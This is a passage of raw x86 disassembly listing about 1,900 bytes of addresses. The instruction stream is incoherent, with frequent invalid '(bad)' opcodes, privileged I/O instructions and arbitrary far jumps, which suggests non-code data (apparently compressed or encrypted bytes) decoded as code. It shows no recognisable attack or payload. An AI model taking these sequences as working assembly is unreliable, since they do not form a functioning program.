  69d0ac:	xlat   BYTE PTR ds:[ebx]
  69d0ad:	add    BYTE PTR [edi+ebx*8-0x225125c5],0x56
  69d0b5:	dec    esp
  69d0b6:	push   eax
  69d0b7:	sbb    al,0x45
  69d0b9:	sbb    bh,BYTE PTR [eax]
  69d0bb:	sahf   
  69d0bc:	shr    edi,0x1
  69d0bf:	fidiv  WORD PTR [ebx-0x151e5b9]
  69d0c5:	nop
  69d0c6:	cmp    DWORD PTR [edx-0x7e],ebx
  69d0c9:	sub    BYTE PTR [eax+0x3a],al
  69d0cc:	out    dx,eax
  69d0cd:	xor    eax,0x9b0e7c3a
  69d0d2:	sbb    eax,0x9fde9d9c
  69d0d7:	jp     0x69d0fb
  69d0d9:	(bad)  
  69d0da:	push   cs
  69d0db:	das    
  69d0dc:	sbb    DWORD PTR [ecx+0x6f],ecx
  69d0df:	pop    ecx
  69d0e0:	push   cs
  69d0e1:	shl    BYTE PTR [ecx+0x1b],1
  69d0e4:	inc    edi
  69d0e5:	mov    dh,BYTE PTR [edx+0x67]
  69d0e8:	iret   
  69d0e9:	jbe    0x69d124
  69d0eb:	xchg   esp,eax
  69d0ec:	cwde   
  69d0ed:	and    eax,0x744d68e4
  69d0f2:	push   ebx
  69d0f3:	jnp    0x69d079
  69d0f5:	jbe    0x69d109
  69d0f7:	lods   al,BYTE PTR ds:[esi]
  69d0f8:	push   es
  69d0f9:	jp     0x69d145
  69d0fb:	ds push ecx
  69d0fd:	push   0xffffff95
  69d0ff:	or     eax,0xb97713ed
  69d104:	pop    es
  69d105:	fcom   st(7)
  69d107:	mov    ds:0x5c868169,al
  69d10c:	add    BYTE PTR [ecx-0x4bbca8f4],cl
  69d112:	dec    ebx
  69d113:	xor    eax,0x3e750352
  69d118:	inc    ebp
  69d119:	pop    eax
  69d11a:	std    
  69d11b:	call   0x620a236c
  69d120:	mov    ds:0x2c183bc0,eax
  69d125:	pusha  
  69d126:	cmp    al,0x7
  69d128:	sub    BYTE PTR [esi],dl
  69d12a:	leave  
  69d12b:	and    esi,DWORD PTR [edx-0x4d]
  69d12e:	xchg   al,ch
  69d130:	push   ss
  69d131:	jmp    0xf39b9b14
  69d136:	ds out 0x4,al
  69d139:	add    bh,BYTE PTR [ebp+edi*4+0x56]
  69d13d:	sub    eax,0x598f9be8
  69d142:	add    eax,DWORD PTR [ecx+0x22]
  69d145:	cmp    ebp,ebx
  69d147:	jp     0x69d102
  69d149:	lds    edx,FWORD PTR ss:[eax+0x377f6add]
  69d150:	loope  0x69d0ed
  69d152:	nop
  69d153:	mov    esi,0x3438fd65
  69d158:	xlat   BYTE PTR ds:[ebx]
  69d159:	lahf   
  69d15a:	mov    BYTE PTR [ebx-0x46b77355],bh
  69d160:	cmp    BYTE PTR [ecx+0x7ff246e4],cl
  69d166:	xchg   esp,eax
  69d167:	xchg   edi,eax
  69d168:	jno    0x69d167
  69d16a:	movsx  esp,ch
  69d16d:	mov    al,ds:0x6586ccd6
  69d172:	and    esp,eax
  69d174:	jg     0x69d108
  69d176:	outs   dx,BYTE PTR ds:[esi]
  69d177:	dec    esi
  69d178:	sbb    esp,DWORD PTR [esi+0x38]
  69d17b:	adc    eax,0xe501955e
  69d180:	test   BYTE PTR [edi-0x48],bh
  69d183:	mov    ds:0x992523ab,eax
  69d188:	xchg   ebx,eax
  69d189:	sub    al,0x1d
  69d18b:	lahf   
  69d18c:	jns    0x69d18a
  69d18e:	data16 jg 0x69d151
  69d191:	and    esi,ebp
  69d193:	push   esi
  69d194:	loope  0x69d12c
  69d196:	cmp    BYTE PTR [esi+0x31cda065],0xfe
  69d19d:	mov    ebx,0x5dc6c07a
  69d1a2:	leave  
  69d1a3:	inc    esi
  69d1a4:	mov    cl,0xf9
  69d1a6:	retf   0x2c35
  69d1a9:	xor    al,0x8e
  69d1ab:	mov    cl,0xd5
  69d1ad:	pop    esp
  69d1ae:	data16 fisttp QWORD PTR [ebp-0x55]
  69d1b2:	dec    eax
  69d1b3:	aas    
  69d1b4:	(bad)  
  69d1b5:	xlat   BYTE PTR ds:[ebx]
  69d1b6:	loop   0x69d140
  69d1b8:	fild   WORD PTR [eax]
  69d1ba:	mov    cl,0xab
  69d1bc:	ja     0x69d1bf
  69d1be:	(bad)  
  69d1bf:	enter  0xa27b,0x5
  69d1c3:	scas   al,BYTE PTR es:[edi]
  69d1c4:	leave  
  69d1c5:	lock sub bl,BYTE PTR [esp+ecx*4-0x7]
  69d1ca:	mov    ah,0x87
  69d1cc:	aad    0xc5
  69d1ce:	int3   
  69d1cf:	je     0x69d219
  69d1d1:	mov    esi,DWORD PTR [eax]
  69d1d3:	xor    BYTE PTR [ecx+0x3d],ch
  69d1d6:	dec    edi
  69d1d7:	cmp    edi,esi
  69d1d9:	xor    edx,DWORD PTR [ebx]
  69d1db:	adc    DWORD PTR ds:0x1a66c5b5,edi
  69d1e1:	aam    0x95
  69d1e3:	add    dl,BYTE PTR [esi+ecx*2+0x1f]
  69d1e7:	(bad)  
  69d1e8:	shl    DWORD PTR [edi],0xe0
  69d1eb:	dec    esi
  69d1ec:	jae    0x69d1fa
  69d1ee:	lods   eax,DWORD PTR ds:[esi]
  69d1ef:	out    dx,al
  69d1f0:	add    cl,al
  69d1f2:	mov    ch,0x53
  69d1f4:	and    esi,DWORD PTR [esi+ebx*4+0x8]
  69d1f8:	(bad)  
  69d1f9:	test   eax,0x56d628b
  69d1fe:	xlat   BYTE PTR ds:[ebx]
  69d1ff:	sar    ecx,0xbd
  69d202:	push   ds
  69d203:	outs   dx,DWORD PTR ds:[esi]
  69d204:	cmp    bh,BYTE PTR [bp+0x1657]
  69d209:	outs   dx,DWORD PTR ds:[esi]
  69d20a:	popf   
  69d20b:	neg    dl
  69d20d:	dec    ecx
  69d20e:	cld    
  69d20f:	imul   ebp,DWORD PTR [edi],0xffffffc4
  69d212:	xlat   BYTE PTR ds:[ebx]
  69d213:	dec    esp
  69d214:	out    0x2d,eax
  69d216:	xor    al,BYTE PTR [edi+esi*2+0x6c293e68]
  69d21d:	xchg   DWORD PTR [eax],edx
  69d21f:	(bad)
  69d222:	lock jb 0x69d211
  69d225:	jmp    0x7ccb4599
  69d22a:	xchg   edi,eax
  69d22b:	and    al,0x5c
  69d22d:	call   0x2294ebf
  69d232:	jno    0x69d29e
  69d234:	mov    cl,BYTE PTR [esi+0xbc24e99]
  69d23a:	retf   0x2032
  69d23d:	xor    dl,bh
  69d23f:	xchg   esi,eax
  69d240:	push   ebx
  69d241:	rcr    DWORD PTR [edi+0x3e092da1],1
  69d247:	mov    ah,0x4a
  69d249:	jmp    0x35ea:0xf8bdef37
  69d250:	pushf  
  69d251:	mov    al,ds:0xadf02931
  69d256:	iret   
  69d257:	les    edi,FWORD PTR [edx]
  69d259:	cmp    DWORD PTR [eax],0x52583bb7
  69d25f:	(bad)  
  69d260:	mov    dl,0x38
  69d262:	mov    dh,0x46
  69d264:	into   
  69d265:	sub    eax,0x8d4b3650
  69d26a:	nop
  69d26b:	mov    ds:0x7359863e,eax
  69d270:	(bad)  
  69d271:	out    dx,al
  69d272:	mov    al,0xfc
  69d274:	sbb    dl,BYTE PTR [eax]
  69d276:	xchg   ecx,eax
  69d277:	mov    ds:0x436e01d3,al
  69d27c:	(bad)
  69d280:	adc    eax,0x434bb99
  69d285:	push   esi
  69d286:	or     ah,BYTE PTR [ebx]
  69d288:	or     eax,0x6410196b
  69d28d:	and    cl,BYTE PTR [esi+0xf]
  69d290:	test   eax,ecx
  69d292:	xchg   esp,eax
  69d293:	mov    bh,0xce
  69d295:	add    eax,0xb54e7196
  69d29a:	ss push 0x2c
  69d29d:	test   BYTE PTR [esi],dl
  69d29f:	nop
  69d2a0:	jbe    0x69d23e
  69d2a2:	mov    ds:0xb2ecc488,al
  69d2a7:	shr    DWORD PTR [eax-0x66],1
  69d2aa:	out    0x68,al
  69d2ac:	push   eax
  69d2ad:	mov    dl,0xf8
  69d2af:	sub    BYTE PTR [ecx],bl
  69d2b1:	push   eax
  69d2b2:	push   esp
  69d2b3:	fild   DWORD PTR [esi-0x72871c27]
  69d2b9:	or     al,0x25
  69d2bb:	pop    edx
  69d2bc:	popf   
  69d2bd:	stos   DWORD PTR es:[edi],eax
  69d2be:	out    0x96,al
  69d2c0:	and    ah,BYTE PTR [ebx-0x40d8bb35]
  69d2c6:	mov    edi,0x95462b59
  69d2cb:	(bad)  
  69d2cc:	jmp    0x52b1:0x5cd9efef
  69d2d3:	bound  esp,QWORD PTR [eax+ebp*1-0x15]
  69d2d7:	mov    edi,0xf9fc9b40
  69d2dc:	inc    ebx
  69d2dd:	push   ebx
  69d2de:	mov    cl,BYTE PTR [edx-0x47ed7a8f]
  69d2e4:	outs   dx,BYTE PTR ds:[esi]
  69d2e5:	cli    
  69d2e6:	mov    ds:0xdadfc9ec,al
  69d2eb:	mov    ds:0x6d17f2c0,al
  69d2f0:	xor    BYTE PTR [esi+0x59ac78e0],0xb9
  69d2f7:	lds    ecx,FWORD PTR ds:0xfd54cb7b
  69d2fd:	mov    bh,0x31
  69d2ff:	pusha  
  69d300:	dec    edx
  69d301:	cdq    
  69d302:	imul   eax,eax,0xc126b715
  69d308:	call   0x49b0eaff
  69d30d:	(bad)  
  69d30e:	sbb    DWORD PTR ds:0xdb5c3267,0x42
  69d315:	icebp  
  69d316:	outs   dx,BYTE PTR ds:[esi]
  69d317:	dec    ebp
  69d318:	clc    
  69d319:	rcl    BYTE PTR ds:0x278b6034,cl
  69d31f:	inc    ebx
  69d320:	addr16 push esi
  69d322:	and    BYTE PTR [ebp-0x5bc21e2e],dl
  69d328:	xor    edi,DWORD PTR [ebx-0x5]
  69d32b:	clc    
  69d32c:	fs cwde 
  69d32e:	adc    dh,BYTE PTR [esi+eax*8]
  69d331:	xor    ecx,0x60
  69d334:	or     bl,dh
  69d336:	mov    bl,0xb2
  69d338:	bswap  edx
  69d33a:	or     eax,0xb18ab6ec
  69d33f:	jle    0x69d368
  69d341:	dec    esi
  69d342:	xchg   ebp,eax
  69d343:	test   al,0x93
  69d345:	and    cl,dl
  69d347:	inc    ebp
  69d348:	(bad)  
  69d349:	int    0xa9
  69d34b:	mov    ebx,0xddfca9e0
  69d350:	shl    BYTE PTR [ecx+0x35],1
  69d353:	jo     0x69d37f
  69d355:	mov    cl,0x5e
  69d357:	xor    edx,DWORD PTR [ecx-0x2d]
  69d35a:	mov    cl,0x90
  69d35c:	xor    BYTE PTR [ebx-0x21dec97],0x4
  69d363:	dec    esp
  69d364:	sub    bl,BYTE PTR [ecx+0xf]
  69d367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69d368:	(bad)  
  69d369:	and    ah,BYTE PTR ds:0x960c5eb8
  69d36f:	call   0xd43039da
  69d374:	cmp    al,dh
  69d376:	xchg   edi,eax
  69d377:	inc    edi
  69d378:	popf   
  69d379:	cmp    al,0xff
  69d37b:	ds mov ebx,0x5c198ce8
  69d381:	dec    edi
  69d382:	mov    DWORD PTR [edx+esi*8],ecx
  69d385:	fldenv [eax]
  69d387:	jb     0x69d404
  69d389:	ret    0x1aa3
  69d38c:	pop    esp
  69d38d:	jns    0x69d401
  69d38f:	and    eax,ecx
  69d391:	arpl   cx,bp
  69d393:	cmp    eax,DWORD PTR [esi-0x3f]
  69d396:	inc    ecx
  69d397:	cmp    bl,BYTE PTR [ecx]
  69d399:	push   esp
  69d39a:	pusha  
  69d39b:	hlt    
  69d39c:	(bad)
  69d39f:	xchg   edx,eax
  69d3a0:	hlt    
  69d3a1:	sub    cl,cl
  69d3a3:	data16 adc BYTE PTR [esi+0x0],dl
  69d3a7:	jne    0x69d3e4
  69d3a9:	test   BYTE PTR [ebp-0x7],dl
  69d3ac:	sub    DWORD PTR [esi+0x28c36abf],ecx
  69d3b2:	pop    eax
  69d3b3:	add    ch,BYTE PTR [ecx]
  69d3b5:	lods   eax,DWORD PTR ds:[esi]
  69d3b6:	xor    BYTE PTR [esi-0x7b0e7c74],0x95
  69d3bd:	jae    0x69d411
  69d3bf:	retf   
  69d3c0:	scas   eax,DWORD PTR es:[edi]
  69d3c1:	aad    0x4b
  69d3c3:	sbb    eax,0x5f14fbdb
  69d3c8:	mov    edx,0xa5419786
  69d3cd:	add    al,0x6
  69d3cf:	mov    gs,WORD PTR [edx]
  69d3d1:	add    edx,edi
  69d3d3:	or     edi,DWORD PTR [ecx+ecx*1]
  69d3d6:	mov    DWORD PTR [eax],edx
  69d3d8:	mov    ah,0xa9
  69d3da:	jne    0x69d432
  69d3dc:	jbe    0x69d431
  69d3de:	jno    0x69d381
  69d3e0:	dec    ebp
  69d3e1:	lea    esi,[ebx]
  69d3e3:	test   al,0x8a
  69d3e5:	sar    BYTE PTR [eax],0x26
  69d3e8:	fiadd  DWORD PTR [eax+0x4a4443f9]
  69d3ee:	inc    edx
  69d3ef:	fldl2t 
  69d3f1:	dec    eax
  69d3f2:	out    dx,al
  69d3f3:	mov    ebp,0x3dcd740
  69d3f8:	lock scas al,BYTE PTR es:[edi]
  69d3fa:	mov    al,ds:0x1d12ec65
  69d3ff:	shl    DWORD PTR [esi],0xfe
  69d402:	rcl    edx,cl
  69d404:	push   ss
  69d405:	xlat   BYTE PTR ds:[ebx]
  69d406:	mov    esp,eax
  69d408:	adc    BYTE PTR [esi-0x419dfeab],ah
  69d40e:	sbb    al,0x53
  69d410:	sbb    al,0xf2
  69d412:	popf   
  69d413:	lock pop edi
  69d415:	or     eax,0x6982b6dc
  69d41a:	test   bl,ch
  69d41c:	icebp  
  69d41d:	nop
  69d41e:	push   ebp
  69d41f:	stc    
  69d420:	mov    bh,0x57
  69d422:	mov    esi,0x28d228aa
  69d427:	push   ss
  69d428:	xor    al,0x82
  69d42a:	stc    
  69d42b:	jo     0x69d414
  69d42d:	test   eax,0x3224a243
  69d432:	scas   eax,DWORD PTR es:[edi]
  69d433:	mov    cl,0x80
  69d435:	rep lods al,BYTE PTR ds:[esi]
  69d437:	scas   eax,DWORD PTR es:[edi]
  69d438:	inc    ecx
  69d439:	pop    eax
  69d43a:	xor    ebx,ebx
  69d43c:	hlt    
  69d43d:	add    ch,dh
  69d43f:	xchg   esp,eax
  69d440:	xchg   edi,eax
  69d441:	cld    
  69d442:	and    esi,eax
  69d444:	jns    0x69d416
  69d446:	mov    WORD PTR [ebp-0x577064ae],cs
  69d44c:	int3   
  69d44d:	in     al,dx
  69d44e:	jmp    0x69d4a0
  69d450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69d451:	aaa    
  69d452:	clc    
  69d453:	rcr    BYTE PTR [edi+0x12],0xe6
  69d457:	jmp    0x69d4b9
  69d459:	rol    BYTE PTR [ecx+0x1a],1
  69d45c:	jo     0x69d463
  69d45e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69d45f:	and    eax,0xe2dfa201
  69d464:	iret   
  69d465:	dec    edx
  69d466:	or     edi,DWORD PTR [edi]
  69d468:	sbb    DWORD PTR [ebx+0x49],ebx
  69d46b:	dec    esi
  69d46c:	pop    edx
  69d46d:	inc    esp
  69d46e:	mov    ecx,0xdc8ea0a4
  69d473:	cli    
  69d474:	dec    esp
  69d475:	cli    
  69d476:	aaa    
  69d477:	mov    al,ds:0x26450a51
  69d47c:	outs   dx,DWORD PTR ds:[esi]
  69d47d:	loop   0x69d4b5
  69d47f:	mov    edi,0x98bf207e
  69d484:	bound  edx,QWORD PTR [edi+0x15]
  69d487:	push   0xffffff81
  69d489:	call   0x4990:0x6d1da7f7
  69d490:	mov    al,ds:0x24b34794
  69d495:	fsincos 
  69d497:	adc    ch,BYTE PTR [edi-0x4fd6ad05]
  69d49d:	mov    dl,0x8d
  69d49f:	int    0x48
  69d4a1:	mov    ch,0x95
  69d4a3:	stos   BYTE PTR es:[edi],al
  69d4a4:	dec    ecx
  69d4a5:	(bad)  
  69d4a6:	cdq    
  69d4a7:	mov    ebx,ds
  69d4a9:	call   0x35bc:0xd1bb4fcb
  69d4b0:	fs loop 0x69d4de
  69d4b3:	repz and edi,ecx
  69d4b6:	sbb    BYTE PTR [esi],cl
  69d4b8:	and    bh,BYTE PTR [ebp-0x71a3b1d4]
  69d4be:	jns    0x69d519
  69d4c0:	mov    ah,0x46
  69d4c2:	ss loop 0x69d52b
  69d4c5:	jmp    0x69d44a
  69d4c7:	daa    
  69d4c8:	shl    BYTE PTR [edi],0x6e
  69d4cb:	shl    DWORD PTR [eax],0xf3
  69d4ce:	repnz xchg edx,eax
  69d4d0:	mov    al,0xe
  69d4d2:	dec    edi
  69d4d3:	jmp    0x69d536
  69d4d5:	dec    edi
  69d4d6:	jecxz  0x69d530
  69d4d8:	bound  ecx,QWORD PTR [ebp+0x76a16fa0]
  69d4de:	jne    0x69d554
  69d4e0:	jle    0x69d545
  69d4e2:	sub    al,0xb
  69d4e4:	ss push esp
  69d4e6:	pop    ds
  69d4e7:	sub    edx,esi
  69d4e9:	push   esp
  69d4ea:	fwait
  69d4eb:	xchg   esi,eax
  69d4ec:	push   ds
  69d4ed:	test   al,0xe9
  69d4ef:	repz ss jbe 0x69d557
  69d4f3:	vandnps xmm7,xmm4,XMMWORD PTR [edx-0x5a]
  69d4f8:	push   edx
  69d4f9:	js     0x69d54d
  69d4fb:	js     0x69d484
  69d4fd:	ds push esi
  69d4ff:	push   eax
  69d500:	cs inc edi
  69d502:	pop    ds
  69d503:	fst    QWORD PTR [eax-0x71fe59b7]
  69d509:	xchg   esi,eax
  69d50a:	mov    ds:0xc726dd4f,al
  69d50f:	add    BYTE PTR [ebx],0xe9
  69d512:	sbb    al,0x1c
  69d514:	pushf  
  69d515:	adc    DWORD PTR [esi-0x567f16a2],ecx
  69d51b:	ret    
  69d51c:	pushf  
  69d51d:	sar    esi,cl
  69d51f:	mov    WORD PTR [edi],cs
  69d521:	pop    edx
  69d522:	cs pop eax
  69d524:	in     eax,dx
  69d525:	jae    0x69d57e
  69d527:	les    esp,FWORD PTR [ebp+0x30]
  69d52a:	xor    ch,BYTE PTR [esi+0x608cb41e]
  69d530:	xchg   ecx,eax
  69d531:	scas   al,BYTE PTR es:[edi]
  69d532:	sbb    al,0xcc
  69d534:	jno    0x69d4eb
  69d536:	sub    DWORD PTR [ebx+0x64321b6b],eax
  69d53c:	fbstp  TBYTE PTR [esi-0x289722de]
  69d542:	or     al,0xc8
  69d544:	adc    al,ah
  69d546:	iret   
  69d547:	outs   dx,DWORD PTR ds:[esi]
  69d548:	jmpw   0xc09a
  69d54c:	push   0xffffffc0
  69d54e:	pusha  
  69d54f:	enter  0x8733,0xc0
  69d553:	xchg   DWORD PTR [eax-0x26],edi
  69d556:	(bad)  
  69d558:	mov    esp,0x4d07b2d1
  69d55d:	add    DWORD PTR [edx-0x11],ecx
  69d560:	dec    ebp
  69d561:	and    cl,BYTE PTR [ebp+ecx*2-0x6606ddeb]
  69d568:	sbb    ecx,edi
  69d56a:	pop    es
  69d56b:	mov    al,0xc3
  69d56d:	stc    
  69d56e:	int3   
  69d56f:	mov    ebx,eax
  69d571:	cmp    esi,edx
  69d573:	lock ret 0x5994
  69d577:	xchg   edx,eax
  69d578:	ss xchg ebx,eax
  69d57a:	cmp    BYTE PTR [esi],bl
  69d57c:	mov    ds:0x50f6b6b7,al
  69d581:	hlt    
  69d582:	fisttp DWORD PTR [eax-0x5d]
  69d585:	or     DWORD PTR [ebp+edi*8-0x42],0xffffff8d
  69d58a:	fs dec esi
  69d58c:	imul   edi,DWORD PTR [ebx],0xb6db772a
  69d592:	xor    BYTE PTR [edi+ebp*4],bl
  69d595:	mov    cl,0x9f
  69d597:	dec    esp
  69d598:	or     DWORD PTR [edx+ecx*8+0x23],0x1866bc4a
  69d5a0:	repnz mov eax,0xfda7fb9c
  69d5a6:	pop    eax
  69d5a7:	xchg   ebx,eax
  69d5a8:	into   
  69d5a9:	or     al,0xdc
  69d5ab:	jl     0x69d603
  69d5ad:	ds dec eax
  69d5af:	lea    edx,[esi-0x5307e244]
  69d5b5:	ss call 0xa5175fd0
  69d5bb:	popa   
  69d5bc:	mov    ebx,0xdf4ca3a2
  69d5c1:	or     dh,BYTE PTR [edx-0x2a]
  69d5c4:	in     al,dx
  69d5c5:	test   BYTE PTR [edi],dh
  69d5c7:	pushf  
  69d5c8:	scas   al,BYTE PTR es:[edi]
  69d5c9:	scas   al,BYTE PTR es:[edi]
  69d5ca:	dec    ebx
  69d5cb:	add    edi,DWORD PTR [edi-0x32c14292]
  69d5d1:	xchg   ebp,eax
  69d5d2:	fmul   DWORD PTR [edi]
  69d5d4:	mov    al,0xda
  69d5d6:	cli    
  69d5d7:	inc    dx
  69d5d9:	sub    al,0xa7
  69d5db:	int3   
  69d5dc:	sub    eax,0xa99c2467
  69d5e1:	int    0xc9
  69d5e3:	pop    ebx
  69d5e4:	and    esp,DWORD PTR [edi+ecx*4+0xc]
  69d5e8:	xor    edx,0x42
  69d5eb:	neg    DWORD PTR [ebp-0x555af73d]
  69d5f1:	mov    ecx,0x16615208
  69d5f6:	clc    
  69d5f7:	sbb    al,0x75
  69d5f9:	test   al,0x83
  69d5fb:	inc    ecx
  69d5fc:	mov    eax,ds:0x71fd7014
  69d601:	fnsave [edx+0x3f]
  69d604:	push   ebx
  69d605:	push   0x86cd49e0
  69d60a:	shl    DWORD PTR [ebp-0x60],cl
  69d60d:	mov    cl,0x94
  69d60f:	scas   al,BYTE PTR es:[edi]
  69d610:	fdivr  QWORD PTR [esi]
  69d612:	test   eax,0x6f044fa5
  69d617:	(bad)  
  69d618:	nop
  69d619:	imul   ecx,ecx,0x4e
  69d61c:	popf   
  69d61d:	and    edx,DWORD PTR ds:0x29ce10d6
  69d623:	pop    esp
  69d624:	and    al,0xa7
  69d626:	inc    BYTE PTR [edi+0x49a8e714]
  69d62c:	dec    eax
  69d62d:	nop
  69d62e:	je     0x69d627
  69d630:	push   0xe77f05c2
  69d635:	cmp    esi,DWORD PTR [esi+0x31]
  69d638:	dec    ebx
  69d639:	or     dl,0xc6
  69d63c:	out    dx,eax
  69d63d:	bound  ecx,QWORD PTR [edx]
  69d63f:	and    DWORD PTR [edi+0x40],0xfffffffe
  69d643:	aam    0x5b
  69d645:	inc    edi
  69d646:	nop
  69d647:	cmp    al,0xa6
  69d649:	mov    al,ds:0xc5124d6a
  69d64e:	mov    eax,ds:0x81e2880c
  69d653:	stos   DWORD PTR es:[edi],eax
  69d654:	jmp    0x69d5e2
  69d656:	out    0x9c,al
  69d658:	adc    BYTE PTR [ebx-0x71e285c6],0xcc
  69d65f:	push   ebx
  69d660:	sub    ebx,DWORD PTR [ebx-0x40a2892c]
  69d666:	xchg   edi,ebx
  69d668:	xchg   esi,eax
  69d669:	fisub  WORD PTR [esi-0x29]
  69d66c:	xor    al,0xe3
  69d66e:	mov    bh,0x88
  69d670:	leave  
  69d671:	jno    0x69d601
  69d673:	cmp    BYTE PTR [ebx+0x35],ah
  69d676:	in     eax,0xc
  69d678:	clc    
  69d679:	xchg   ecx,eax
  69d67a:	loope  0x69d685
  69d67c:	cwde   
  69d67d:	cmp    bh,BYTE PTR [ecx]
  69d67f:	xchg   edi,eax
  69d680:	jne    0x69d621
  69d682:	repnz add esi,DWORD PTR [ebx]
  69d685:	cmp    DWORD PTR [eax],ebx
  69d687:	adc    al,0x8c
  69d689:	dec    eax
  69d68a:	jle    0x69d6d5
  69d68c:	fnstenv [edx+0x6222b01e]
  69d692:	xor    eax,0x5d293cc2
  69d697:	jg     0x69d717
  69d699:	aaa    
  69d69a:	dec    ebx
  69d69b:	mov    BYTE PTR [edi+0x4dbc02e4],bh
  69d6a1:	mov    dh,ah
  69d6a3:	adc    BYTE PTR [ebp-0x67884b70],dl
  69d6a9:	imul   edi,DWORD PTR [ecx-0x6740d6bc],0xffffffa8
  69d6b0:	test   BYTE PTR [ebp+0x68],0x3e
  69d6b4:	addr16 add eax,0x107fc964
  69d6ba:	dec    ebp
  69d6bb:	push   edx
  69d6bc:	in     eax,dx
  69d6bd:	inc    ebx
  69d6be:	mov    DWORD PTR [esi],edi
  69d6c0:	dec    esp
  69d6c1:	call   0x4aa1:0x6f5cd48
  69d6c8:	push   ebp
  69d6c9:	pop    ss
  69d6ca:	retf   
  69d6cb:	stc    
  69d6cc:	cmp    DWORD PTR ds:0x2d963ef4,edx
  69d6d2:	ins    BYTE PTR es:[edi],dx
  69d6d3:	add    al,0x43
  69d6d5:	cdq    
  69d6d6:	sub    BYTE PTR [edi],ch
  69d6d8:	bound  edi,QWORD PTR [esi+0x3c]
  69d6db:	sti    
  69d6dc:	pop    eax
  69d6dd:	lods   al,BYTE PTR ds:[esi]
  69d6de:	pop    ebx
  69d6df:	clc    
  69d6e0:	jns    0x69d67a
  69d6e2:	int3   
  69d6e3:	cmp    BYTE PTR [edi+0x1d],dl
  69d6e6:	or     BYTE PTR [edx],dh
  69d6e8:	(bad)  
  69d6ea:	out    dx,eax
  69d6eb:	rcl    BYTE PTR [edi],1
  69d6ed:	jmp    0x642c:0xd3af5d5
  69d6f4:	in     al,0xa
  69d6f6:	push   0xad3692a0
  69d6fb:	mov    ss,WORD PTR [edx]
  69d6fd:	pushf  
  69d6fe:	and    al,0xa
  69d700:	les    esp,FWORD PTR [edx]
  69d702:	mov    ds:0xc92989c8,al
  69d707:	sbb    DWORD PTR es:[edx],ebx
  69d70a:	(bad)  
  69d70b:	jbe    0x69d69a
  69d70d:	(bad)  
  69d70e:	jo     0x69d6ca
  69d710:	mov    ds:0x21251697,eax
  69d715:	pop    ebp
  69d716:	dec    esi
  69d717:	xor    ah,BYTE PTR [ebx-0x44]
  69d71a:	jae    0x69d6f4
  69d71c:	dec    esi
  69d71d:	adc    DWORD PTR [ebx+0x28a774cf],edx
  69d723:	and    eax,0x162c33d7
  69d728:	sbb    ah,0x5f
  69d72b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69d72c:	sub    ebp,esi
  69d72e:	pop    ds
  69d72f:	adc    DWORD PTR [eax+0x22ec17af],ebp
  69d735:	push   edx
  69d736:	out    0xd5,al
  69d738:	mov    edx,0x9d3202fc
  69d73d:	sahf   
  69d73e:	mov    eax,0xd1fc400b
  69d743:	pop    ds
  69d744:	add    eax,0xddf5ae7f
  69d749:	mov    DWORD PTR [ebx+ebp*8-0x4f],ebp
  69d74d:	mov    ch,0x44
  69d74f:	lahf   
  69d750:	sahf   
  69d751:	nop
  69d752:	enter  0x155b,0x83
  69d756:	ds daa 
  69d758:	loope  0x69d707
  69d75a:	cmp    BYTE PTR [bx],bl
  69d75d:	xchg   esi,eax
  69d75e:	test   DWORD PTR [ecx+ebx*1-0x266dc310],edx
  69d765:	mov    esp,0x4da35f97
  69d76a:	fisttp DWORD PTR [eax+0x4e]
  69d76d:	sti    
  69d76e:	test   eax,0xd5d6f2a1
  69d773:	cmp    ebp,0x3
  69d776:	xchg   ecx,eax
  69d777:	dec    ebx
  69d778:	sahf   
  69d779:	ss mov ch,0x85
  69d77c:	push   esp
  69d77d:	retf   0xce64
  69d780:	dec    edi
  69d781:	dec    esi
  69d782:	sar    DWORD PTR [ebx+edx*1],cl
  69d785:	inc    edi
  69d786:	retf   
  69d787:	pop    DWORD PTR [ecx+edi*8+0x39]
  69d78b:	test   eax,0x7f353320
  69d790:	jbe    0x69d7e7
  69d792:	scas   eax,DWORD PTR es:[edi]
  69d793:	xchg   BYTE PTR [esi],bl
  69d795:	adc    al,0xbf
  69d797:	ss jle 0x69d750
  69d79a:	xchg   esp,eax
  69d79b:	loope  0x69d735
  69d79d:	mov    ds,WORD PTR [ecx]
  69d79f:	sahf   
  69d7a0:	sbb    BYTE PTR [edi-0xe65cb25],ch
  69d7a6:	pop    edi
  69d7a7:	icebp  
  69d7a8:	jge    0x69d7c8
  69d7aa:	lea    ebx,[ebp-0x14]
  69d7ad:	loopne 0x69d7cb
  69d7af:	cmp    esi,DWORD PTR [eax]
  69d7b1:	iret   
  69d7b2:	loopne 0x69d7a6
  69d7b4:	sub    BYTE PTR [ecx-0x4f2c6868],dh
  69d7ba:	jmp    0x130:0x23b63028
  69d7c1:	inc    edi
  69d7c2:	mov    edi,0xd45cc1d3
  69d7c7:	cmp    eax,0x7dabfaf2
  69d7cc:	(bad)  
  69d7cd:	fidivr DWORD PTR [ebp+0x197a698a]
  69d7d3:	imul   esi,DWORD PTR [ebp+0x23],0x1a7bef9
  69d7da:	add    ch,al
  69d7dc:	cmp    al,ch
  69d7de:	popf   
  69d7df:	cld    
  69d7e0:	mov    bh,0x88
  69d7e2:	mov    bl,0xff
  69d7e4:	mov    ds:0x6933a82c,al
  69d7e9:	xor    esp,DWORD PTR [eax]
  69d7eb:	mov    esp,0x2e931041
  69d7f0:	dec    ebp
  69d7f1:	fnstsw WORD PTR [ebp+ebx*8+0x1a217fcd]
  69d7f8:	add    ah,bl
  69d7fa:	xchg   esp,eax
  69d7fb:	jle    0x69d830
  69d7fd:	movups xmm4,XMMWORD PTR [ebx-0xa602e8f]
  69d804:	mov    ch,0xab
  69d806:	push   ds
  69d807:	sbb    eax,0x3512135a
  69d80c:	pop    ss
  69d80d:	leave  
  69d80e:	ret    
  69d80f:	mov    dl,0x2b
  69d811:	shl    DWORD PTR [eax],0x3c
  69d814:	fld    st(7)
  69d816:	inc    esi
  69d817:	mul    BYTE PTR [ebx-0x80]
  69d81a:	cmp    bl,BYTE PTR [eax+0x34]
  69d81d:	or     eax,0x20fbade6
  69d822:	sbb    BYTE PTR [ebx-0xb],cl
  69d825:	push   ecx
  69d826:	mov    al,ds:0x898ed1ea
  69d82b:	sbb    ah,BYTE PTR [ebx+esi*1+0x23]
  69d82f:	mov    al,0xda
  69d831:	rol    DWORD PTR [edx+0x3f],1
  69d834:	adc    eax,0x71f6a818
